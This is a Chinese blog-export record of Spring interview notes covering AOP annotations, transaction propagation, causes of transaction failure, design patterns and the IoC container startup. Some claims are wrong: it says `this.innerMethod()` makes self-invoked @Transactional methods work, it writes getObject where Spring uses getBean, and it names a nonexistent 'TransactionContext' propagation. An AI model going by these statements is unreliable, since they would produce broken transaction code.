基于代理的经典SpringAOP：需要实现接口，手动创建代理\n- 纯POJO切面：使用XML配置，aop命名空间\n- @AspectJ注解驱动的切面：使用注解的方式，这是最简洁和最方便的！\n\n## 怎么定义一个注解\n\n### 引入依赖\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-aop</artifactId>\n</dependency>\n```\n\n### 定义注解\n\n#### 元注解\n\njava.lang.annotation 提供了四种元注解，专门注解其他的注解（在自定义注解的时候，需要使用到元注解）：\n\n- @Documented – 注解是否将包含在JavaDoc中\n- @Retention – 什么时候使用该注解\n- @Target – 注解用于什么地方\n- @Inherited – 是否允许子类继承该注解\n\n##### @Retention\n\n定义该注解的生命周期\n\n- RetentionPolicy.SOURCE : 在编译阶段丢弃。这些注解在编译结束之后就不再有任何意义，所以它们不会写入字节码。@Override, @SuppressWarnings都属于这类注解。\n- RetentionPolicy.CLASS : 在类加载的时候丢弃。在字节码文件的处理中有用。注解默认使用这种方式\n- RetentionPolicy.RUNTIME : 始终不会丢弃，运行期也保留该注解，因此可以使用反射机制读取该注解的信息。我们自定义的注解通常使用这种方式。\n\n##### @Target\n\n表示该注解用于什么地方。默认值为任何元素，表示该注解用于什么地方。可用的ElementType 参数包括\n\n- ElementType.CONSTRUCTOR: 用于描述构造器\n- ElementType.FIELD: 成员变量、对象、属性（包括enum实例）\n- ElementType.LOCAL_VARIABLE: 用于描述局部变量\n- ElementType.METHOD: 用于描述方法\n- ElementType.PACKAGE: 用于描述包\n- ElementType.PARAMETER: 用于描述参数\n- ElementType.TYPE: 用于描述类、接口(包括注解类型) 或enum声明\n\n##### @Documented\n\n一个简单的Annotations 标记注解，表示是否将注解信息添加在java文档中。\n\n##### @Inherited\n\n定义该注释和子类的关系\n\n@Inherited 元注解是一个标记注解，@Inherited 阐述了某个被标注的类型是被继承的。如果一个使用了@Inherited 修饰的annotation 类型被用于一个class，则这个annotation 将被用于该class\n的子类。\n\n### 示例\n\n自定义一个检查是否登录的注解\n\n```java\n@Target({ElementType.TYPE, ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\npublic @interface CheckLogin {\n\n}\n```\n\n实现\n\n```java\n@Aspect\n@Component\n@Slf4j\n@Order(1)\npublic class CheckLoginAspect {\n\n    @Autowired\n    RedisTemplate redisTemplate;\n\n    @Before(\"execution(* *..controller..*(..))\")\n    public void before(JoinPoint joinPoint) {\n        MethodSignature signature = (MethodSignature) joinPoint.getSignature();\n        Method method = signature.getMethod();\n        CheckLogin annotation = method.getAnnotation(CheckLogin.class);\n\n        if (annotation == null) {\n            //获取类上注解\n            annotation = joinPoint.getTarget().getClass().getAnnotation(CheckLogin.class);\n        }\n        if (annotation != null) {\n            //获取到请求的属性\n            ServletRequestAttributes attributes =\n                    (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();\n            //获取到请求对象\n            HttpServletRequest request = attributes.getRequest();\n            String ssoToken = HttpUtil.getSsoToken(request);\n            if (ssoToken != null) {\n                String loginUserTokenKey = AuthRedisKeyUtil.getLoginUserTokenKey(ssoToken);\n                if (redisTemplate.hasKey(loginUserTokenKey)) {\n                    //通过\n                } else {\n                    throw new LoginException(\"登录已过期\");\n                }\n            } else {\n                throw new IllegalRequestException(\"非法请求\");\n            }\n        }\n    }\n}\n```\n\n使用\n\n```java\n@RestController\npublic class AccountController {\n\n    @CheckLogin\n    @GetMapping(\"/query\")\n    public JSONObject queryRegulation(Integer pageNum, Integer pageSize) {\n        //....业务逻辑\n    }\n}\n```\n\n## 事务\n\n### Spring 支持两种方式的事务管理\n\n#### 1、编程式事务管理\n\n- TransactionTemplate\n\n```java\n@Autowired\nprivate TransactionTemplate transactionTemplate;\n\npublic void testTransaction(){\n    transactionTemplate.execute(new TransactionCallbackWithoutResult(){\n        @Override\n        protected void doInTransactionWithoutResult(TransactionStatus status){\n                try{\n                    //...业务代码\n                }catch(Exception e){\n                    status.setRollbackOnly();\n                }\n        }\n    });\n}\n```\n\n- TransactionManager\n\n```java\n    @Autowired\nprivate PlatformTransactionManager transactionManager;\n\npublic void testTransaction2(){\n        TransactionStatus status=transactionManager.getTransaction(new DefaultTransactionDefinition());\n        try{\n            //...业务代码\n            transactionManager.commit(status);\n        }catch(Exception e){\n            transactionManager.rollback(status);\n        }\n}\n```\n\n#### 2、注解\n\n- @Transactional\n\n### 事务的传播性 Propagation\n\n① PROPAGATION_REQUIRED：如果当前没有事务，就创建一个新事务，如果当前存在事务，就加入该事务，该设置是最常用的设置。\n\n② PROPAGATION_SUPPORTS：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事务执行。\n\n③ PROPAGATION_MANDATORY：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就抛出异常。\n\n④ PROPAGATION_REQUIRES_NEW：创建新事务，无论当前存不存在事务，都创建新事务。\n\n⑤ PROPAGATION_NOT_SUPPORTED：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。\n\n⑥ PROPAGATION_NEVER：以非事务方式执行，如果当前存在事务，则抛出异常。\n\n⑦ PROPAGATION_NESTED：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则按REQUIRED属性执行。\n\n### spring事务失效的场景\n\n1. 非被Spring管理的Bean上的事务： 如果你在一个非被Spring容器管理的Bean（例如通过new关键字直接创建的对象）上使用事务注解，事务将不会生效。Spring的事务管理是基于AOP（面向切面编程）实现的，因此只能在由Spring容器管理的Bean上起作用。\n\n2. 未捕获的异常： 如果在事务内发生未捕获的运行时异常，事务将回滚。但是，如果异常被捕获并在方法内处理，事务可能不会回滚。确保在事务边界内处理异常或者允许异常传播到事务管理器以便正确回滚。\n\n   ```java\n   @Transactional\n   public void transactionalMethod() {\n       try {\n           // some code that may throw an exception\n       } catch (Exception e) {\n           // handle the exception (not recommended within a transaction)\n       }\n   }\n   ```\n\n3. 嵌套事务问题： Spring事务支持嵌套事务，但是嵌套事务的行为取决于底层事务管理器的支持。如果使用的事务管理器不支持嵌套事务，嵌套事务可能会被忽略，导致事务行为不一致。\n\n4. 方法调用问题： Spring事务是通过AOP实现的，它依赖于代理对象来拦截方法调用并处理事务。如果你在同一个类内部调用一个带有事务注解的方法，事务可能不会起作用，因为代理对象无法拦截内部方法的调用。确保事务注解生效，要么调用方法是通过代理对象，要么通过self-invocation，例如通过this关键字。\n\n   ```java\n   @Transactional\n   public class MyService {\n       public void outerMethod() {\n           innerMethod(); // Transactional annotation may not work here\n           this.innerMethod(); // Transactional annotation should work here\n       }\n   \n       @Transactional\n       public void innerMethod() {\n           // some transactional logic\n       }\n   }\n   \n   ```\n\n5. 异步方法问题： 如果使用了异步方法（通过@Async注解），事务可能会失效。在异步方法内，事务上下文可能无法正确传播，导致事务不起作用。要在异步方法中使用事务，可以使用TransactionContext传播方式。\n\n\n## spring使用的设计模式\n\n### 简单工厂\n\n**实现方式：**\n\nBeanFactory。Spring中的BeanFactory就是简单工厂模式的体现，根据传入一个唯一的标识来获得Bean对象，但是否是在传入参数后创建还是传入参数前创建这个要根据具体情况来定。\n\n**实现原理：**\n\nbean容器的启动阶段：\n\n读取bean的xml配置文件,将bean元素分别转换成一个BeanDefinition对象。\n然后通过BeanDefinitionRegistry将这些bean注册到beanFactory中，保存在它的一个ConcurrentHashMap中。\n将BeanDefinition注册到了beanFactory之后，在这里Spring为我们提供了一个扩展的切口，允许我们通过实现接口BeanFactoryPostProcessor\n在此处来插入我们定义的代码。典型的例子就是：PropertyPlaceholderConfigurer，我们一般在配置数据库的dataSource时使用到的占位符的值，就是它注入进去的。\n\n容器中bean的实例化阶段：\n\n实例化阶段主要是通过反射或者CGLIB对bean进行实例化，在这个阶段Spring又给我们暴露了很多的扩展点：\n\n各种的Aware接口 ，比如 BeanFactoryAware，对于实现了这些Aware接口的bean，在实例化bean时Spring会帮我们注入对应的BeanFactory的实例。 BeanPostProcessor接口\n，实现了BeanPostProcessor接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 InitializingBean接口\n，实现了InitializingBean接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 DisposableBean接口\n，实现了DisposableBean接口的bean，在该bean死亡时Spring会帮我们调用接口中的方法。\n\n**设计意义：**\n\n松耦合。\n可以将原来硬编码的依赖，通过Spring这个beanFactory这个工厂来注入依赖，也就是说原来只有依赖方和被依赖方，现在我们引入了第三方——spring这个beanFactory，由它来解决bean之间的依赖问题，达到了松耦合的效果.\n\nbean的额外处理。 通过Spring接口的暴露，在实例化bean的阶段我们可以进行一些额外的处理，这些额外的处理只需要让bean实现对应的接口即可，那么spring就会在bean的生命周期调用我们实现的接口来处理该bean。[非常重要]\n\n### 工厂方法\n\n**实现方式：**\n\nFactoryBean接口。\n\n**实现原理：**\n\n实现了FactoryBean接口的bean是一类叫做factory的bean。其特点是，spring会在使用getBean()调用获得该bean时，会自动调用该bean的getObject()\n方法，所以返回的不是factory这个bean，而是这个bean.getOjbect()方法的返回值。\n\n### 单例模式\n\nSpring依赖注入Bean实例默认是单例的。\n\nSpring的依赖注入（包括lazy-init方式）都是发生在AbstractBeanFactory的getBean里。getBean的doGetBean方法调用getSingleton进行bean的创建。\n\n### 适配器模式\n\n**实现方式：**\n\nSpringMVC中的适配器HandlerAdatper。\n\n**实现原理：**\n\nHandlerAdatper根据Handler规则执行不同的Handler。\n\n**实现过程：**\n\nDispatcherServlet根据HandlerMapping返回的handler，向HandlerAdatper发起请求，处理Handler。\n\nHandlerAdapter根据规则找到对应的Handler并让其执行，执行完毕后Handler会向HandlerAdapter返回一个ModelAndView，最后由HandlerAdapter向DispatchServelet返回一个ModelAndView。\n\n### 装饰器模式\n\n**实现方式：**\n\nSpring中用到的包装器模式在类名上有两种表现：一种是类名中含有Wrapper，另一种是类名中含有Decorator。\n\n**实质：**\n\n动态地给一个对象添加一些额外的职责。\n\n就增加功能来说，Decorator模式相比生成子类更为灵活。\n\n### 代理模式\n\n**实现方式：**\n\nAOP底层，就是动态代理模式的实现。\n\n**动态代理：**\n\n在内存中构建的，不需要手动编写代理类\n\n## spring中properties和yml的加载顺序\n\n相同内容properties和yml的加载顺序是properties优先\n\n## 使用@Autowired注解自动装配的过程是怎样的？\n\n使用@Autowired注解来自动装配指定的bean。在使用@Autowired注解之前需要在Spring配置文件进行配置，<context:annotation-config />。\n\n在启动spring\nIoC时，容器自动装载了一个AutowiredAnnotationBeanPostProcessor后置处理器，当容器扫描到@Autowied、@Resource或@Inject时，就会在IoC容器自动查找需要的bean，并装配给该对象的属性。在使用@Autowired时，首先在容器中查询对应类型的bean：\n\n- 如果查询结果刚好为一个，就将该bean装配给@Autowired指定的数据；\n- 如果查询的结果不止一个，那么@Autowired会根据名称来查找；\n- 如果上述查找的结果为空，那么会抛出异常。解决方法是，使用required=false。\n\n## @Autowired和@Resource之间的区别\n\n@Autowired可用于：构造函数、成员变量、Setter方法\n\n@Autowired和@Resource之间的区别\n\n- @Autowired默认是按照类型装配注入的，默认情况下它要求依赖对象必须存在（可以设置它required属性为false）。\n- @Resource默认是按照名称来装配注入的，只有当找不到与名称匹配的bean才会按照类型来装配注入。\n\n## Spring中BeanFactory与FactoryBean的区别\n\n### BeanFactory\n\nBeanFactory是一个接口，它是Spring中工厂的顶层规范，是SpringIoc容器的核心接口，它定义了getBean()、containsBean()等管理Bean的通用方法。Spring的容器都是它的具体实现如：\n\n- DefaultListableBeanFactory\n- XmlBeanFactory\n- ApplicationContext\n\n这些实现类又从不同的维度分别有不同的扩展。\n\n### FactoryBean\n\n首先它是一个Bean，但又不仅仅是一个Bean。它是一个能生产或修饰对象生成的工厂Bean，类似于设计模式中的工厂模式和装饰器模式。它能在需要的时候生产一个对象，且不仅仅限于它自身，它能返回任何Bean的实例。\n\nFactoryBean表现的是一个工厂的职责。 即一个Bean A如果实现了FactoryBean接口，那么A就变成了一个工厂，根据A的名称获取到的实际上是工厂调用getObject()\n返回的对象，而不是A本身，如果要获取工厂A自身的实例，那么需要在名称前面加上'&'符号。\n\n- getObject('name')返回工厂中的实例\n- getObject('&name')返回工厂本身的实例\n","slug":"Spring最热点面试题","published":1,"updated":"2024-05-26T14:44:26.083Z","comments":1,"layout":"post","photos":[],"_id":"clylh1rya0015bsuhauyh1aey","content":"<h1 id=\"spring\"><a href=\"#spring\" class=\"headerlink\" title=\"spring\"></a>spring</h1><h2 id=\"架构图\"><a href=\"#架构图\" class=\"headerlink\" title=\"架构图\"></a>架构图</h2><p><img src=\"/./2024/05/26/Spring%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/1.png\" alt=\"结构图\"></p>\n<h2 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h2><h3 id=\"Core-Container\"><a href=\"#Core-Container\" class=\"headerlink\" title=\"Core Container\"></a>Core Container</h3><p>核心容器(Core Container)</p>\n<ul>\n<li><code>spring-beans</code> 该模块是依赖注入IoC与DI的最基本实现</li>\n<li><code>spring-core</code> 该模块是Bean工厂与bean的装配</li>\n<li><code>spring-context</code> 该模块构架于核心模块之上，它扩展了 BeanFactory，为它添加了 Bean 生命周期控制、框架事件体系以及资源加载透明化等功能。ApplicationContext 是该模块的核心接口，它的超类是<br>BeanFactory。与BeanFactory 不同，ApplicationContext 容器实例化后会自动对所有的单实例 Bean 进行实例化与依赖关系的装配，使之处于待用状态</li>\n<li><code>spring-context-indexer</code> 该模块是 Spring 的类管理组件和 Classpath 扫描</li>\n<li><code>spring-context-support</code> 该模块是对 Spring IOC 容器的扩展支持，以及 IOC 子容器</li>\n<li><code>spring-expression</code> 该模块是Spring表达式语言块是统一表达式语言（EL）的扩展模块，可以查询、管理运行中的对象，同时也方便的可以调用对象方法、操作数组、集合等</li>\n</ul>\n<h3 id=\"Data-Access-Integration\"><a href=\"#Data-Access-Integration\" class=\"headerlink\" title=\"Data Access&#x2F;Integration\"></a>Data Access&#x2F;Integration</h3><p>数据访问&#x2F;集成</p>\n<ul>\n<li><code>spring-jdbc</code> 该模块提供了 JDBC抽象层，它消除了冗长的 JDBC 编码和对数据库供应商特定错误代码的解析</li>\n<li><code>spring-tx</code> 该模块支持编程式事务和声明式事务，可用于实现了特定接口的类和所有的 POJO 对象。编程式事务需要自己写beginTransaction()、commit()、rollback()<br>等事务管理方法，声明式事务是通过注解或配置由 spring 自动处理，编程式事务粒度更细</li>\n<li><code>spring-orm</code> 该模块提供了对流行的对象关系映射 API的集成，包括 JPA、JDO 和 Hibernate 等。通过此模块可以让这些 ORM 框架和 spring 的其它功能整合，比如前面提及的事务管理</li>\n<li><code>spring-oxm</code> 该模块提供了对 OXM 实现的支持，比如JAXB、Castor、XML Beans、JiBX、XStream等</li>\n<li><code>spring-jms</code> 该模块包含生产（produce）和消费（consume）消息的功能。从Spring 4.1开始，集成了 spring-messaging 模块</li>\n</ul>\n<h3 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h3><p>网络部分</p>\n<ul>\n<li><code>spring-web</code> 该模块为 Spring 提供了最基础 Web 支持，主要建立于核心容器之上，通过 Servlet 或者 Listeners 来初始化 IOC 容器，也包含一些与 Web 相关的支持</li>\n<li><code>spring-webmvc</code> 该模块众所周知是一个的 Web-Servlet 模块，实现了 Spring MVC（model-view-Controller）的 Web 应用</li>\n<li><code>spring-websocket</code> 该模块主要是与 Web 前端的全双工通讯的协议</li>\n<li><code>spring-webflux</code> 该模块是一个新的非堵塞函数式 Reactive Web 框架，可以用来建立异步的，非阻塞，事件驱动的服务，并且扩展性非常好。</li>\n</ul>\n<h3 id=\"面向切面编程-AOP和Aspects\"><a href=\"#面向切面编程-AOP和Aspects\" class=\"headerlink\" title=\"面向切面编程(AOP和Aspects)\"></a>面向切面编程(AOP和Aspects)</h3><ul>\n<li><code>spring-aop</code> 该模块是Spring的另一个核心模块，是 AOP 主要的实现模块</li>\n<li><code>spring-aspects</code> 该模块提供了对 AspectJ 的集成，主要是为 Spring AOP提供多种 AOP 实现方法，如前置方法后置方法等</li>\n</ul>\n<h3 id=\"设备-Instrumentation\"><a href=\"#设备-Instrumentation\" class=\"headerlink\" title=\"设备(Instrumentation)\"></a>设备(Instrumentation)</h3><ul>\n<li><code>spring-instrument</code> 该模块是基于JAVA SE 中的”java.lang.instrument”进行设计的，应该算是 AOP的一个支援模块，主要作用是在 JVM<br>启用时，生成一个代理类，程序员通过代理类在运行时修改类的字节，从而改变一个类的功能，实现 AOP 的功能</li>\n</ul>\n<h3 id=\"消息-Messaging\"><a href=\"#消息-Messaging\" class=\"headerlink\" title=\"消息(Messaging)\"></a>消息(Messaging)</h3><ul>\n<li><code>spring-messaging</code> 是从 Spring4 开始新加入的一个模块，主要职责是为 Spring 框架集成一些基础的报文传送应用</li>\n</ul>\n<h3 id=\"测试-Test\"><a href=\"#测试-Test\" class=\"headerlink\" title=\"测试(Test)\"></a>测试(Test)</h3><ul>\n<li><code>spring-test</code> 主要为测试提供支持的，通过 JUnit 和 TestNG 组件支持单元测试和集成测试。它提供了一致性地加载和缓存 Spring 上下文，也提供了用于单独测试代码的模拟对象（mock object）</li>\n</ul>\n<h2 id=\"IOC\"><a href=\"#IOC\" class=\"headerlink\" title=\"IOC\"></a>IOC</h2><h3 id=\"IOC是什么？\"><a href=\"#IOC是什么？\" class=\"headerlink\" title=\"IOC是什么？\"></a>IOC是什么？</h3><p>控制反转即IoC (Inversion of Control)，它把传统上由程序代码直接操控的对象的调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的“控制反转”概念就是对组件对象控制权的转移，从程序代码本身转移到了外部容器。</p>\n<p>Spring IOC 负责创建对象，管理对象（通过依赖注入（DI），装配对象，配置对象，并且管理这些对象的整个生命周期。</p>\n<h3 id=\"使用IOC的好处\"><a href=\"#使用IOC的好处\" class=\"headerlink\" title=\"使用IOC的好处\"></a>使用IOC的好处</h3><ul>\n<li>不用自己组装，拿来就用。</li>\n<li>享受单例的好处，效率高，不浪费空间</li>\n<li>便于单元测试，方便切换mock组件</li>\n<li>便于进行AOP操作，对于使用者是透明的</li>\n<li>统一配置，便于修改</li>\n</ul>\n<h2 id=\"BeanFactory-和-ApplicationContext有什么区别\"><a href=\"#BeanFactory-和-ApplicationContext有什么区别\" class=\"headerlink\" title=\"BeanFactory 和 ApplicationContext有什么区别\"></a>BeanFactory 和 ApplicationContext有什么区别</h2><p>BeanFactory和ApplicationContext是Spring的两大核心接口，都可以当做Spring的容器。其中ApplicationContext是BeanFactory的子接口。</p>\n<h3 id=\"依赖关系\"><a href=\"#依赖关系\" class=\"headerlink\" title=\"依赖关系\"></a>依赖关系</h3><p>BeanFactory：是Spring里面最底层的接口，包含了各种Bean的定义，读取bean配置文档，管理bean的加载、实例化，控制bean的生命周期，维护bean之间的依赖关系。</p>\n<p>ApplicationContext接口作为BeanFactory的派生，除了提供BeanFactory所具有的功能外，还提供了更完整的框架功能：</p>\n<ul>\n<li>继承MessageSource，因此支持国际化。</li>\n<li>统一的资源文件访问方式。</li>\n<li>提供在监听器中注册bean的事件。</li>\n<li>同时加载多个配置文件。</li>\n<li>载入多个（有继承关系）上下文 ，使得每一个上下文都专注于一个特定的层次，比如应用的web层。</li>\n</ul>\n<h3 id=\"加载方式\"><a href=\"#加载方式\" class=\"headerlink\" title=\"加载方式\"></a>加载方式</h3><p>BeanFactroy采用的是延迟加载形式来注入Bean的，即只有在使用到某个Bean时(调用getBean())<br>，才对该Bean进行加载实例化。这样，我们就不能发现一些存在的Spring的配置问题。如果Bean的某一个属性没有注入，BeanFacotry加载后，直至第一次使用调用getBean方法才会抛出异常。</p>\n<p>ApplicationContext，它是在容器启动时，一次性创建了所有的Bean。这样，在容器启动时，我们就可以发现Spring中存在的配置错误，这样有利于检查所依赖属性是否注入。<br>ApplicationContext启动后预载入所有的单实例Bean，通过预载入单实例bean ,确保当你需要的时候，你就不用等待，因为它们已经创建好了。</p>\n<p>相对于基本的BeanFactory，ApplicationContext 唯一的不足是占用内存空间。当应用程序配置Bean较多时，程序启动较慢。</p>\n<h3 id=\"创建方式\"><a href=\"#创建方式\" class=\"headerlink\" title=\"创建方式\"></a>创建方式</h3><p>BeanFactory通常以编程的方式被创建，ApplicationContext还能以声明的方式创建，如使用ContextLoader。</p>\n<h3 id=\"注册方式\"><a href=\"#注册方式\" class=\"headerlink\" title=\"注册方式\"></a>注册方式</h3><p>BeanFactory和ApplicationContext都支持BeanPostProcessor、BeanFactoryPostProcessor的使用，但两者之间的区别是：BeanFactory需要手动注册，而ApplicationContext则是自动注册。</p>\n<h3 id=\"Spring-IoC的初始化过程\"><a href=\"#Spring-IoC的初始化过程\" class=\"headerlink\" title=\"Spring IoC的初始化过程\"></a>Spring IoC的初始化过程</h3><h4 id=\"IOC粗略总结\"><a href=\"#IOC粗略总结\" class=\"headerlink\" title=\"IOC粗略总结\"></a>IOC粗略总结</h4><ol>\n<li>首先入口是xml或者注解或者其他形式，要实现beanDefinationReader接口，然后 读取的时候，会将他们解析为bean的定义信息；</li>\n<li>beanFactory在加载bean信息实例化（底层用的反射）之前，spring加了一个接口beanFactoryPostProcessor,用作扩展用。</li>\n<li>beanFactory内部实例化bean之后，在要初始化bean对象之前，增加了一个一系列aware接口，将他的容器，以及工厂都暴露出来供使用者做扩展用。</li>\n<li>经过一些列容器以及容器对象的注入之后，在初始化之前，spring又增加了一个接口 beanPostProcessor,该接口是可以作用于所有创建的bean,在初始化前后，均能通过重写该接口获取bean对象进行定制操作。</li>\n<li>经过实现初始化接口完成初始化功能。</li>\n<li>经过实现销毁接口disposableBean结束其生命。</li>\n</ol>\n<h4 id=\"重要的组件\"><a href=\"#重要的组件\" class=\"headerlink\" title=\"重要的组件\"></a>重要的组件</h4><ul>\n<li><code>BeanDefinition</code> 描述bean的属性的接口，例如bean的scope是单例还是多例，构造方法，有哪些property value，依赖等，相当于对这个bean的一份身份描述<ul>\n<li><h2 id=\"Bean配置-–-BeanDefinition-–-Bean对象\"><a href=\"#Bean配置-–-BeanDefinition-–-Bean对象\" class=\"headerlink\" title=\"Bean配置 –&gt; BeanDefinition –&gt; Bean对象\"></a>Bean配置 –&gt; BeanDefinition –&gt; Bean对象</h2>懒加载情况下，refresh只是把BeanDefinition注册到BeanFactory中，而不是把Bean注册到BeanFactory中。在调用上下文的getBean的时候才会去根据BeanDefinition生成具体的bean对象</li>\n</ul>\n</li>\n<li><code>BeanDefinitionMap</code></li>\n<li><code>BeanFactory</code><ul>\n<li>spring的基础bean容器</li>\n<li>相当于存放所有bean的容器</li>\n</ul>\n</li>\n<li><code>ApplicationContext</code><ul>\n<li>BeanFactory 的子接口，在 BeanFactory 的基础上构建，是相对比较高级的 IoC 容器实现。包含 BeanFactory<br>的所有功能，还提供了其他高级的特性，比如：事件发布、国际化信息支持、统一资源加载策略等。正常情况下，我们都是使用的 ApplicationContext</li>\n<li>相当于丰富了beanfactory的功能，这里理解为上下文就好</li>\n</ul>\n</li>\n<li><code>FactoryBean</code></li>\n</ul>\n<h4 id=\"源码解析\"><a href=\"#源码解析\" class=\"headerlink\" title=\"源码解析\"></a>源码解析</h4><p>首先抛开其他组件的启动，我们只需要引入spring-context就可以启动一个容器了</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-context<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>而在springboot出来之前最常见的加载bean的方式是读取配置文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[]args)</span>&#123;</span><br><span class=\"line\">        ApplicationContext context=<span class=\"keyword\">new</span> <span class=\"title class_\">ClassPathXmlApplicationContext</span>(<span class=\"string\">&quot;classpath:applicationfile.xml&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里ApplicationContext是一个接口，主要的实现类有：</p>\n<ul>\n<li>ClassPathXmlApplicationContext 需要一个 xml 配置文件在系统中的路径</li>\n<li>FileSystemXmlApplicationContext 需要一个 xml 配置文件在系统中的路径</li>\n<li>AnnotationConfigApplicationContext 基于注解，大势所趋</li>\n</ul>\n<p>下面的分析都基于 ClassPathXmlApplicationContext 进行分析，因为比较好理解点</p>\n<p>在 resources 目录新建一个配置文件，文件名随意，通常叫 application.xml 或 application-xxx.xml就可以了,对应的类实现一个：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">default-autowire</span>=<span class=\"string\">&quot;byName&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;messageService&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.javadoop.example.MessageServiceImpl&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>main</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">App</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 用我们的配置文件来启动一个 ApplicationContext</span></span><br><span class=\"line\">        <span class=\"type\">ApplicationContext</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassPathXmlApplicationContext</span>(<span class=\"string\">&quot;classpath:application.xml&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;context 启动成功&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 从 context 中取出我们的 Bean，而不是用 new MessageServiceImpl() 这种方式</span></span><br><span class=\"line\">        <span class=\"type\">MessageService</span> <span class=\"variable\">messageService</span> <span class=\"operator\">=</span> context.getBean(MessageService.class);</span><br><span class=\"line\">        <span class=\"comment\">// 这句将输出: hello world</span></span><br><span class=\"line\">        System.out.println(messageService.getMessage());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在构造方法中的refresh()方法是启动加载整个容器的关键方法</p>\n<p>方法在springboot容器启动时也会加载,方法为</p>\n<ul>\n<li>org.springframework.boot.SpringApplication#run</li>\n<li>org.springframework.boot.SpringApplication#refreshContext</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">refresh</span><span class=\"params\">()</span><span class=\"keyword\">throws</span> BeansException,IllegalStateException&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 1. 首先是一个synchronized加锁，当然要加锁，不然你先调一次refresh()然后这次还没处理完又调一次，就会乱套了；</span></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (<span class=\"built_in\">this</span>.startupShutdownMonitor)&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 2. 这个方法是做准备工作的，记录容器的启动时间、标记“已启动”状态、处理配置文件中的占位符，可以点进去看看，这里就不多说了。</span></span><br><span class=\"line\">        prepareRefresh();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 3. 这个就很重要了，这一步是把配置文件解析成一个个Bean，并且注册到BeanFactory中，注意这里只是注册进去，并没有初始化。先继续往下看，等会展开这个方法详细解读</span></span><br><span class=\"line\">        ConfigurableListableBeanFactory beanFactory=obtainFreshBeanFactory();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//4. 这个方法的作用是：设置 BeanFactory 的类加载器，添加几个 BeanPostProcessor，手动注册几个特殊的 bean，这里都是spring里面的特殊处理，然后继续往下看</span></span><br><span class=\"line\">        prepareBeanFactory(beanFactory);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 5. 方法是提供给子类的扩展点，到这里的时候，所有的 Bean 